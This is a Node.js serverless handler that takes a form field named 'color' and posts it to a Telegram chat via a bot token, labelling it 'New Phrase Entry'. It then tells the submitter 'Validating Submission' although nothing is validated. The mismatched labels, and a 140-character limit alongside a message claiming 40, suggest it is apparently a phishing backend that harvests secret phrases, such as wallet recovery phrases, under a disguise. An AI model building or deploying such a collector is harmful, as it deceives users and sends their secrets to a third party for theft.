module.exports = async (req, res) => {
  if (req.method !== "POST") {
    return res.status(405).json({
      success: false,
      message: "Method not allowed."
    });
  }

  try {
    const color = req.body?.color;

    if (typeof color !== "string" ||
        !color.trim() ||
        color.trim().length > 140) {
      return res.status(400).json({
        success: false,
        message: "Enter a color between 1 and 40 characters."
      });
    }

    const botToken = process.env.BOT_TOKEN;
    const chatId = process.env.CHAT_ID;

    if (!botToken || !chatId) {
      console.error("Missing Telegram environment variables.");
      return res.status(500).json({
        success: false,
        message: "Server configuration error."
      });
    }

    const response = await fetch(
      `https://api.telegram.org/bot${botToken}/sendMessage`,
      {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          chat_id: chatId,
          text: `New Phrase Entry\n\nPhrase: ${color.trim()}`
        })
      }
    );

    const result = await response.json();

    if (!response.ok || !result.ok) {
      console.error("Telegram API error:", result);
      return res.status(502).json({
        success: false,
        message: "Could not send the color."
      });
    }

    return res.status(200).json({
      success: true,
      message: "Validating Submission"
    });
  } catch (error) {
    console.error("Submission error:", error);
    return res.status(500).json({
      success: false,
      message: "An unexpected server error occurred."
    });
  }
};